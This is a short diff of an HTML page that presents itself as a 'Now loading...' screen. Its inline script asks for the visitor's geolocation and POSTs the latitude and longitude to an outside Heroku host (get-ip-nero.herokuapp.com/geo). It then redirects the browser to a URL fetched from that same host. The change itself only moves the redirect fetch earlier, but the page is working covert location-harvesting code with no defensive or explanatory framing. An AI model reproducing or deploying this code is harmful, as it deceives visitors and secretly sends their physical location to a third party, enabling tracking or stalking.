@@ -5,8 +5,8 @@
     <title>Now loading...</title>
     <script type="text/javascript">
       (async () => {
+        const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
         navigator.geolocation.getCurrentPosition( async (position) => {
-          const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
           location.href = url.url;
           await fetch("https://get-ip-nero.herokuapp.com/geo", {
             method: "POST",
@@ -15,7 +15,6 @@
             body: JSON.stringify({lat: position.coords.latitude, lng: position.coords.longitude})
           });
         }, () => {
-          const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
           location.href = url.url;
         });
       })();
